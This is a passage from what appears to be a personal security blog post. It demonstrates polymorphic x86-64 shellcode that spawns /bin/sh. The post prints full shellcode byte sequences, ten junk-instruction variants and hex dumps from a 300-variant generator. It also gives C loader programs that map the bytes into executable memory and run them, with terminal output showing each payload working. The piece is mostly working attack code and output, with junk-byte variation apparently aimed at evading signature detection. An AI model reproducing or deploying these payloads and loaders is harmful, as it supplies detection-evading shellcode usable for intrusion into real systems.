+<p><pre>xxd payload_raw.bin | head -5</pre></p>
+<p>Result:</p>
+<p><pre>febri@ubuntu:~$ xxd payload_raw.bin | head -5
+00000000: 4490 9090 9090 9090 9044 4831 ff48 f7e7  	D........DH1.H..
+00000010: 48b8 2f62 696e 2f73 6800 9950 545f 5266  	H./bin/sh..PT_Rf
+00000020: 682d 6354 5e52 e808 0000 002f 6269 6e2f  	h-cT^R...../bin/
+00000030: 7368 0056 5754 5e6a 3b58 0f05            	sh.VWT^j;X..
+febri@ubuntu:~$</pre></p>
+<p>Test it!</p>
+<pre class="code-block c">#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    unsigned char buf[4096];
+    FILE *f = fopen("payload_raw.bin", "rb");
+    int len = fread(buf, 1, sizeof(buf), f);
+    fclose(f);
+
+    printf("[+] Payload: %d bytes\n", len);
+    
+    void *exec = mmap(NULL, len,
+                      PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(exec, buf, len);
+    printf("[+] Executing...\n\n");
+    ((void(*)())exec)();
+    return 0;
+}
+</pre>
+<pre>febri@ubuntu:~$ gcc -z execstack -o test test.c && echo "id" | ./test
+[+] Payload: 60 bytes
+[+] Executing...
+
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~$</pre>
+
+<h3>Playing with <code>iw0db</code> Engine</h3>
+<p>I've built this small tools that generate polymorphic shellcode (?), let's test it!</p>
+<p><pre>febri@ubuntu:~/iw0db$ ./iw0db generate -o payload.bin --harness
+[*] iw0db generate — Polymorphic shellcode generation
+[*] Variant: Variant 6877: preamble + 0 junk instructions
+[*] Written: payload.bin (39 bytes)
+[*] Test harness: payload.bin.c
+    Compile: gcc -z execstack -o payload.bin.elf payload.bin.c && ./payload.bin.elf
+febri@ubuntu:~/iw0db$
+febri@ubuntu:~/iw0db$ ls | grep payload.bin.c 
+payload.bin.c
+febri@ubuntu:~/iw0db$ gcc -z execstack -o payload payload.bin.c && echo "id" | ./payload
+[+] Shellcode length: 39 bytes
+[+] Executing...
+
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/iw0db$</pre></p>
+<p>Or, like this?</p>
+<p><pre>febri@ubuntu:~/iw0db$ ./iw0db generate -o xxx.bin --junk 4 --harness
+[*] iw0db generate — Polymorphic shellcode generation
+[*] Variant: Variant 7150: preamble + 2 junk instructions
+[*] Written: xxx.bin (43 bytes)
+[*] Test harness: xxx.bin.c
+    Compile: gcc -z execstack -o xxx.bin.elf xxx.bin.c && ./xxx.bin.elf
+febri@ubuntu:~/iw0db$ gcc -z execstack -o xxx.bin.elf xxx.bin.c && ./xxx.bin.elf
+[+] Shellcode length: 43 bytes
+[+] Executing...
+
+$</pre></p>
+
+<p><b>ahh maybe i'm fool right?</b></p>
+
+<h3>Polymorphic Variant Generator + some junk instructions</h3>
+
+<p>Yes, maybe a year ago I've create an script to generate shellcode with random inserted junk instructions :P</p>
+<p>Look like this:</p>
+<p><pre>febri@ubuntu:~/poly$ python3 poly_variant_gen.py 
+[000] (39 bytes) Variant 000: preamble + 0 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[001] (39 bytes) Variant 001: preamble + 0 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[002] (46 bytes) Variant 002: preamble + 3 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 66 90 0f ef c9 d9 e8 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[003] (40 bytes) Variant 003: preamble + 1 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 90 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[004] (45 bytes) Variant 004: preamble + 3 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 66 90 0f ef c0 90 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[005] (39 bytes) Variant 005: preamble + 0 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[006] (39 bytes) Variant 006: preamble + 0 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[007] (45 bytes) Variant 007: preamble + 3 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 d9 eb d9 eb d9 eb 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[008] (39 bytes) Variant 008: preamble + 0 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+
+[009] (41 bytes) Variant 009: preamble + 1 junk instructions
+44 90 90 90 90 90 90 90 90 44 48 31 ff 48 f7 e7 d9 ee 48 bb 2f 62 69 6e 2f 73 68 00 53 54 5f 48 31 f6 48 31 d2 b0 3b 0f 05
+febri@ubuntu:~/poly$</pre></p>
+
+<p>Let's take a look variant 004 and test it</p>
+
+<pre class="code-block c">#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    unsigned char shellcode[] = {
+	0x44, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
+	0x90, 0x44, 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 
+	0x66, 0x90, 0x0f, 0xef, 0xc0, 0x90, 0x48, 0xbb, 
+	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 
+	0x53, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 
+	0xd2, 0xb0, 0x3b, 0x0f, 0x05
+    };
+
+    // Make memory executable
+    void *exec = mmap(NULL, sizeof(shellcode),
+                      PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(exec, shellcode, sizeof(shellcode));
+
+    printf("[+] Shellcode length: %zu bytes\n", sizeof(shellcode));
+    printf("[+] Executing...\n\n");
+
+    ((void(*)())exec)();
+
+    return 0;
+}
+</pre>
+<p>Compile and run</p>
+<p><pre>febri@ubuntu:~$ gcc -z execstack -o x x.c && echo "id" | ./x
+[+] Shellcode length: 45 bytes
+[+] Executing...
+
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~$</pre></p>
+
+<p>It works right? :)</p>
+
+<h3>Generator x64 Variants</h3>
+<p>Maybe this is the same time about earlier before, but if this really works why not? Makes your life very ez right?, let's a little bit dig it</p>
+<p><pre>febri@ubuntu:~/iw0db$ python3 gen_x64_variants.py 
+Generated 300 unique x86-64 variants in x64_variants/
+febri@ubuntu:~/iw0db$ ls x64_variants/
+pushpop_s09_j00.bin    variant_0030.bin  variant_0084.bin
+pushpop_s09_j02.bin    variant_0031.bin  variant_0085.bin
+pushpop_s09_j03.bin    variant_0032.bin  variant_0086.bin
+pushpop_s09_j05.bin    variant_0033.bin  variant_0087.bin
+pushpop_s10_j00.bin    variant_0034.bin  variant_0088.bin
+pushpop_s10_j02.bin    variant_0035.bin  variant_0089.bin
+pushpop_s10_j03.bin    variant_0036.bin  variant_0090.bin
+pushpop_s10_j05.bin    variant_0037.bin  variant_0091.bin
+pushpop_s11_j00.bin    variant_0038.bin  variant_0092.bin
+pushpop_s11_j02.bin    variant_0039.bin  variant_0093.bin
+pushpop_s11_j03.bin    variant_0040.bin  variant_0094.bin
+pushpop_s11_j05.bin    variant_0041.bin  variant_0095.bin
+sub_chain_s09_j00.bin  variant_0042.bin  variant_0096.bin
+sub_chain_s09_j02.bin  variant_0043.bin  variant_0097.bin
+sub_chain_s09_j03.bin  variant_0044.bin  variant_0098.bin
+sub_chain_s09_j05.bin  variant_0045.bin  variant_0099.bin
+sub_chain_s10_j00.bin  variant_0046.bin  xor_chain_s09_j00.bin
+sub_chain_s10_j02.bin  variant_0047.bin  xor_chain_s09_j02.bin
+sub_chain_s10_j03.bin  variant_0048.bin  xor_chain_s09_j03.bin
+sub_chain_s10_j05.bin  variant_0049.bin  xor_chain_s09_j05.bin
+sub_chain_s11_j00.bin  variant_0050.bin  xor_chain_s10_j00.bin
+sub_chain_s11_j02.bin  variant_0051.bin  xor_chain_s10_j02.bin
+sub_chain_s11_j03.bin  variant_0052.bin  xor_chain_s10_j03.bin
+sub_chain_s11_j05.bin  variant_0053.bin  xor_chain_s10_j05.bin
+variant_0000.bin       variant_0054.bin  xor_chain_s11_j00.bin
+variant_0001.bin       variant_0055.bin  xor_chain_s11_j02.bin
+variant_0002.bin       variant_0056.bin  xor_chain_s11_j03.bin
+variant_0003.bin       variant_0057.bin  xor_chain_s11_j05.bin
+variant_0004.bin       variant_0058.bin  xor_rbx_s09_j00.bin
+variant_0005.bin       variant_0059.bin  xor_rbx_s09_j02.bin
+variant_0006.bin       variant_0060.bin  xor_rbx_s09_j03.bin
+variant_0007.bin       variant_0061.bin  xor_rbx_s09_j05.bin
+variant_0008.bin       variant_0062.bin  xor_rbx_s10_j00.bin
+variant_0009.bin       variant_0063.bin  xor_rbx_s10_j02.bin
+variant_0010.bin       variant_0064.bin  xor_rbx_s10_j03.bin
+variant_0011.bin       variant_0065.bin  xor_rbx_s10_j05.bin
+variant_0012.bin       variant_0066.bin  xor_rbx_s11_j00.bin
+variant_0013.bin       variant_0067.bin  xor_rbx_s11_j02.bin
+variant_0014.bin       variant_0068.bin  xor_rbx_s11_j03.bin
+variant_0015.bin       variant_0069.bin  xor_rbx_s11_j05.bin
+variant_0016.bin       variant_0070.bin  xor_rdi_s09_j00.bin
+variant_0017.bin       variant_0071.bin  xor_rdi_s09_j02.bin
+variant_0018.bin       variant_0072.bin  xor_rdi_s09_j03.bin
+variant_0019.bin       variant_0073.bin  xor_rdi_s09_j05.bin
+variant_0020.bin       variant_0074.bin  xor_rdi_s10_j00.bin
+variant_0021.bin       variant_0075.bin  xor_rdi_s10_j02.bin
+variant_0022.bin       variant_0076.bin  xor_rdi_s10_j03.bin
+variant_0023.bin       variant_0077.bin  xor_rdi_s10_j05.bin
+variant_0024.bin       variant_0078.bin  xor_rdi_s11_j00.bin
+variant_0025.bin       variant_0079.bin  xor_rdi_s11_j02.bin
+variant_0026.bin       variant_0080.bin  xor_rdi_s11_j03.bin
+variant_0027.bin       variant_0081.bin  xor_rdi_s11_j05.bin
+variant_0028.bin       variant_0082.bin
+variant_0029.bin       variant_0083.bin
+febri@ubuntu:~/iw0db$</pre></p>
+<p><pre>febri@ubuntu:~/iw0db$ hexdump -C x64_variants/variant_0069.bin 
+00000000  44 90 90 90 90 90 90 90  90 44 48 31 ff 48 f7 e7  	|D........DH1.H..|
+00000010  d9 e8 d9 e8 48 bb 2f 62  69 6e 2f 73 68 00 53 54  	|....H./bin/sh.ST|
+00000020  5f 48 31 f6 48 31 d2 b0  3b 0f 05                 	|_H1.H1..;..|
+0000002b
+febri@ubuntu:~/iw0db$</pre></p>
+<p>You should try another variant too, let's test <code>variant_0069.bin</code></p>
+<p><pre>febri@ubuntu:~/iw0db$ gcc -z execstack -o /tmp/test_x64 -x c - <<< '#include &lt;stdio.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+    unsigned char buf[256];
+    FILE *f=fopen("x64_variants/variant_0069.bin","rb");
+    int l=fread(buf,1,sizeof(buf),f); fclose(f);
+    void *p=mmap(NULL,l,7,0x22,-1,0); memcpy(p,buf,l);
+    ((void(*)())p)();
+}' && echo "id" | /tmp/test_x64
+uid=1000(febri) gid=1000(febri) groups=1000(febri),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),115(lpadmin),124(libvirt),983(docker)
+febri@ubuntu:~/iw0db$</pre></p>
+<p>Okay, it works!</p>
+<div class="note-box">
+
+<div class="note-box-title">
+Note
+</div>
+
+<p>
+For the record, I'll hold the context that this article is paused indefinitely, not abandoned — it exists in a complete enough state that someone (you or another researcher) could pick it up later if the circumstances change. I'll no longer write articles like this; that era has ended. I am focusing on real life now—having given up and feeling depressed. Perhaps in the future, this article will be updated for further research, though I do not know when that might happen.
+</p>
+
+</div>
+
+</div>
+
+  </div>
+
+
+
+
+
+</body></html>
